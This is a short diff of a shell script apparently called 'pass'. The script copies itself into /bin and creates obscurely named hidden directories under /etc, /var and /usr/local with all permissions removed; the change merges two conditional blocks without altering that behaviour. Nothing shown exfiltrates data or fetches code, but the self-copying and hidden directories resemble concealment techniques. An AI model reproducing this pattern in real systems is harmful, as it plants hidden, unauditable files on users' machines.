@@ -19,14 +19,9 @@ if [ ! -e /bin/pass ]; then
     chmod a-rwx "$0"
     chmod u+rx "$0"
     cp "$0" /bin
-fi
-if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
-    mkdir /etc/.raulm /etc/.raulm/.Ye
-    chmod a-rwx /etc/.raulm
-    mkdir /var/.Hj
-    chmod a-rwx /var/.Hj
-    mkdir /usr/local/.ko
-    chmod a-rwx /usr/local/.ko
+elif [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
+    mkdir /etc/.raulm  /etc/.raulm/.Ye  /var/.Hj  /usr/local/.ko
+    chmod a-rwx /etc/.raulm  /var/.Hj  /usr/local/.ko
 fi
     
 #######
